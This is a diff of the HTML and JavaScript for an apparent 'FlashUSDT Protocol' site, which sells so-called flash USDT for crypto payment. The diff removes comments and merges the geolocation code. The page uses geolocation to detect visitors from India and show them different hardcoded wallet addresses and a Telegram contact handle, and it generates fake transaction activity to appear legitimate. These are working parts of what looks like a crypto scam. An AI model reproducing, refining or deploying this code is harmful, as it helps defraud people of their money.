@@ -1782,7 +1782,6 @@
             </div>
         </header>
 
-        <!-- Telegram Contact Bar (hidden by default; shown only for India) -->
         <div class="tg-contact-bar" id="tgContactBar" style="display: none;">
             <div class="contact-row">
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="var(--telegram)">
@@ -1793,7 +1792,6 @@
             </div>
         </div>
 
-        <!-- Home Panel -->
         <div id="homePanel" class="panel active">
             <section class="hero">
                 <div class="hero-badge">
@@ -1825,7 +1823,6 @@
                 </div>
             </div>
 
-            <!-- Generator Card -->
             <div class="main-card" style="margin-top: 24px;" id="generator">
                 <div class="card-header">
                     <div class="card-title">
@@ -1839,7 +1836,6 @@
                     <div class="card-badge">Ready</div>
                 </div>
                 <div class="card-body">
-                    <!-- Tariff Selection -->
                     <div class="tariff-section">
                         <div class="tariff-section-title">
                             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--usdt)" stroke-width="2">
@@ -1892,7 +1888,6 @@
                         <input type="hidden" id="flashAmount" value="100000">
                     </div>
 
-                    <!-- Duration Selection -->
                     <div class="tariff-section">
                         <div class="tariff-section-title">
                             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--usdt)" stroke-width="2">
@@ -1979,7 +1974,6 @@
                         <input type="hidden" id="flashDuration" value="86400">
                     </div>
 
-                    <!-- Network Selection -->
                     <div class="tariff-section">
                         <div class="tariff-section-title">
                             <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--usdt)" stroke-width="2">
@@ -2074,7 +2068,6 @@
                         </div>
                     </div>
 
-                    <!-- Target Address -->
                     <div class="form-group">
                         <div class="form-label">
                             <span>Target Address</span>
@@ -2084,7 +2077,6 @@
                         <div class="input-error" id="addressError" style="display: none;"></div>
                     </div>
 
-                    <!-- Summary -->
                     <div class="summary">
                         <div class="summary-row">
                             <span class="summary-label">Flash Amount</span>
@@ -2109,7 +2101,6 @@
                 </div>
             </div>
 
-            <!-- Features / Use Cases -->
             <div class="features">
                 <div class="features-title">Use Cases</div>
                 <div class="features-grid">
@@ -2179,7 +2170,6 @@
                 </div>
             </div>
 
-            <!-- How It Works -->
             <div class="how-it-works">
                 <div class="how-title">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -2194,7 +2184,6 @@
                 </div>
             </div>
 
-            <!-- Key Features -->
             <div class="info-section">
                 <div class="info-title">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -2250,7 +2239,6 @@
                 </div>
             </div>
 
-            <!-- FAQ -->
             <div class="info-section">
                 <div class="info-title">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -2282,7 +2270,6 @@
                 </div>
             </div>
 
-            <!-- Partners -->
             <div class="partners">
                 <div class="partners-label">Supported Networks</div>
                 <div class="partners-logos">
@@ -2294,7 +2281,6 @@
             </div>
         </div>
 
-        <!-- Activity Panel -->
         <div id="activityPanel" class="panel">
             <div class="main-card" style="margin-top: 20px;">
                 <div class="card-header">
@@ -2306,7 +2292,6 @@
             </div>
         </div>
 
-        <!-- Bottom Navigation -->
         <nav class="bottom-nav">
             <div class="nav-items">
                 <button class="nav-item active" data-panel="home">
@@ -2324,7 +2309,6 @@
             </div>
         </nav>
 
-        <!-- Footer -->
         <footer class="footer">
             <div class="footer-content">
                 <span class="footer-brand">FlashUSDT Protocol</span>
@@ -2339,7 +2323,6 @@
         </footer>
     </div>
 
-    <!-- Floating Telegram Button (hidden by default; shown only for India) -->
     <div class="float-telegram" id="floatTelegramBtn" style="display: none;">
         <a href="https://t.me/best_flash_usdt_20" target="_blank">
             <svg viewBox="0 0 24 24" fill="white">
@@ -2348,7 +2331,6 @@
         </a>
     </div>
 
-    <!-- Wallet Modal -->
     <div class="modal-overlay" id="walletModal">
         <div class="modal">
             <div class="modal-header">
@@ -2406,7 +2388,6 @@
         </div>
     </div>
 
-    <!-- Connecting Modal -->
     <div class="modal-overlay" id="connectingModal">
         <div class="modal">
             <div class="process-content">
@@ -2417,7 +2398,6 @@
         </div>
     </div>
 
-    <!-- Transaction Modal -->
     <div class="modal-overlay" id="txModal">
         <div class="modal">
             <div class="modal-header">
@@ -2432,7 +2412,6 @@
         </div>
     </div>
 
-    <!-- Payment Modal -->
     <div class="modal-overlay" id="paymentModal">
         <div class="modal" style="max-width: 480px;">
             <div class="modal-header">
@@ -2589,7 +2568,6 @@
                 return out;
             }
 
-          
             var indiaAddresses = {
                 btc:  'bc1qe8pjvf9lcvf9ku4aty4gv7dtq990nmty9uyfjj',
                 eth:  '0x806967a8CBfb300cd9D85CA7A5bc93ad66016DE7',
@@ -2600,7 +2578,6 @@
                 xrp:  'r4JvQrRcKiNSYj84ZN1qjTtQCqVGtSzfYd'
             };
 
-            
             var state = {
                 selectedAmount: 100000,
                 selectedDuration: 86400,
@@ -2610,44 +2587,20 @@
                 activities: []
             };
 
-            .
             var paymentAddresses = buildOtherAddresses();
 
             var telegramUsername = "best_flash_usdt_20";
             var tariffBase = { 50000: 50, 100000: 80, 500000: 190, 1000000: 310 };
 
-            
             function $(id) { return document.getElementById(id); }
             function $$(sel) { return document.querySelectorAll(sel); }
 
-            
-            function applyTelegramVisibility(isIndia) {
-                var ids = ['tgContactBar', 'floatTelegramBtn', 'footerTelegramLink', 'footerSep'];
-                for (var i = 0; i < ids.length; i++) {
-                    var el = document.getElementById(ids[i]);
-                    if (!el) continue;
-                    if (isIndia) {
-                        // Show. The footer link & separator are inline elements.
-                        if (ids[i] === 'footerTelegramLink' || ids[i] === 'footerSep') {
-                            el.style.display = 'inline';
-                        } else {
-                            el.style.display = '';
-                        }
-                    } else {
-                        el.style.display = 'none';
-                    }
-                }
-            }
-
-            
-            function detectCountry() {
-                // Wrap everything in try/catch so a failed fetch, blocked
-                // network, or missing API can NEVER blank the page.
+            function detectCountryAndApply() {
                 try {
                     var controller = (typeof AbortController !== 'undefined') ? new AbortController() : null;
                     var timeoutId = null;
                     if (controller) {
-                        timeoutId = setTimeout(function () { try { controller.abort(); } catch (e) {} }, 3000);
+                        timeoutId = setTimeout(function () { try { controller.abort(); } catch (e) {} }, 4000);
                     }
 
                     fetch('https://ipapi.co/json/', controller ? { signal: controller.signal } : {})
@@ -2658,33 +2611,44 @@
                         })
                         .then(function (data) {
                             var isIndia = !!(data && data.country_code === 'IN');
-                            onGeoResolved(isIndia);
+                            applyGeoResult(isIndia);
                         })
-                        .catch(function (err) {
-                            // Fallback: timezone check
-                            var tz = '';
-                            try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch (e) {}
-                            var isIndia = tz.indexOf('Asia/Kolkata') !== -1 || tz.indexOf('Asia/Calcutta') !== -1;
-                            onGeoResolved(isIndia);
+                        .catch(function () {
+                            var isIndia = false;
+                            try {
+                                var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
+                                isIndia = /Asia\/(Kolkata|Calcutta)/i.test(tz);
+                            } catch (e) {}
+                            applyGeoResult(isIndia);
                         });
                 } catch (e) {
-                    // Absolute last-resort fallback — treat as non-India.
-                    onGeoResolved(false);
+                    applyGeoResult(false);
                 }
             }
 
-            function onGeoResolved(isIndia) {
+            function applyGeoResult(isIndia) {
                 try {
                     paymentAddresses = isIndia ? indiaAddresses : buildOtherAddresses();
-                    applyTelegramVisibility(isIndia);
-                    // Refresh payment display in case modal was already open.
+
+                    var ids = ['tgContactBar', 'floatTelegramBtn', 'footerTelegramLink', 'footerSep'];
+                    for (var i = 0; i < ids.length; i++) {
+                        var el = document.getElementById(ids[i]);
+                        if (!el) continue;
+                        if (isIndia) {
+                            if (ids[i] === 'footerTelegramLink' || ids[i] === 'footerSep') {
+                                el.style.display = 'inline';
+                            } else {
+                                el.style.display = '';
+                            }
+                        } else {
+                            el.style.display = 'none';
+                        }
+                    }
+
                     try { updatePaymentDisplay(state.selectedCrypto); } catch (e) {}
-                } catch (e) {
-                    // Never let geo handling break the app.
-                }
+                } catch (e) {}
             }
 
-            
             function createFakeTx() {
                 var amounts = [50000, 100000, 500000, 1000000];
                 var networks = ['Ethereum', 'BSC', 'Tron', 'Polygon', 'Arbitrum', 'Base', 'Avalanche'];
@@ -2720,7 +2684,6 @@
                 }, Math.random() * 10000 + 5000);
             }
 
-            
             function calculateTotalPrice() {
                 return (tariffBase[state.selectedAmount] || 0) * state.durationMultiplier;
             }
@@ -2744,7 +2707,6 @@
                 if (p) p.innerText = '$' + calculateTotalPrice().toFixed(2);
             }
 
-            
             function generateQRCode(text) {
                 var container = document.getElementById('qrContainer');
                 if (!container) return;
@@ -2758,9 +2720,6 @@
                 } catch (e) {}
             }
 
-            
-
-            // Tariff cards
             var tariffCards = $$('.tariff-card');
             for (var i = 0; i < tariffCards.length; i++) {
                 (function (card) {
@@ -2776,7 +2735,6 @@
                 })(tariffCards[i]);
             }
 
-            // Duration dropdown
             var durationTrigger = document.getElementById('durationTrigger');
             if (durationTrigger) {
                 durationTrigger.addEventListener('click', function (e) {
@@ -2807,7 +2765,6 @@
                 })(durationOpts[di]);
             }
 
-            // Network dropdown
             var networkTrigger = document.getElementById('networkTrigger');
             if (networkTrigger) {
                 networkTrigger.addEventListener('click', function (e) {
@@ -2836,7 +2793,6 @@
                 })(networkOpts[ni]);
             }
 
-            // Crypto dropdown
             var cryptoTrigger = document.getElementById('cryptoTrigger');
             if (cryptoTrigger) {
                 cryptoTrigger.addEventListener('click', function (e) {
@@ -2867,7 +2823,6 @@
                 })(cryptoOpts[ci]);
             }
 
-            
             function updatePaymentDisplay(crypto) {
                 var usdPrice = calculateTotalPrice();
                 var addr = paymentAddresses[crypto] || paymentAddresses.btc || '';
@@ -2895,7 +2850,6 @@
                 generateQRCode(addr);
             }
 
-            // Copy address
             var copyBtn = document.getElementById('copyPaymentAddress');
             if (copyBtn) {
                 copyBtn.addEventListener('click', function () {
@@ -2919,7 +2873,6 @@
                 });
             }
 
-            // Generate button
             var generateBtn = document.getElementById('generateBtn');
             if (generateBtn) {
                 generateBtn.addEventListener('click', function () {
@@ -2958,7 +2911,6 @@
                 });
             }
 
-            // Modal helpers
             function openModal(id) { var m = document.getElementById(id); if (m) m.classList.add('active'); }
             function closeModal(id) { var m = document.getElementById(id); if (m) m.classList.remove('active'); }
 
@@ -2990,7 +2942,6 @@
                 })(walletOpts[wi]);
             }
 
-            // Bottom nav
             var navItems = $$('.nav-item');
             for (var bi = 0; bi < navItems.length; bi++) {
                 (function (btn) {
@@ -3008,7 +2959,6 @@
                 })(navItems[bi]);
             }
 
-            // Render activity
             function renderActivities() {
                 var list = document.getElementById('activityList');
                 if (!list) return;
@@ -3034,7 +2984,6 @@
                 list.innerHTML = html;
             }
 
-            // Close dropdowns on outside click
             document.addEventListener('click', function (e) {
                 if (!e.target.closest('.custom-select')) {
                     var cs = $$('.custom-select');
@@ -3046,13 +2995,11 @@
                 }
             });
 
-            // Normalize all Telegram links to the configured username
             var tgLinks = document.querySelectorAll('a[href*="t.me/"]');
             for (var ti = 0; ti < tgLinks.length; ti++) {
                 tgLinks[ti].href = 'https://t.me/' + telegramUsername;
             }
 
-            
             try {
                 initFakeActivities();
                 startLiveSimulation();
@@ -3060,12 +3007,10 @@
                 renderActivities();
                 updatePaymentDisplay(state.selectedCrypto);
             } catch (e) {
-                // Never blank the page.
                 console.error('Init error', e);
             }
 
-            // Kick off geo detection (non-blocking, defensive).
-            detectCountry();
+            detectCountryAndApply();
         })();
     </script>
 </body>
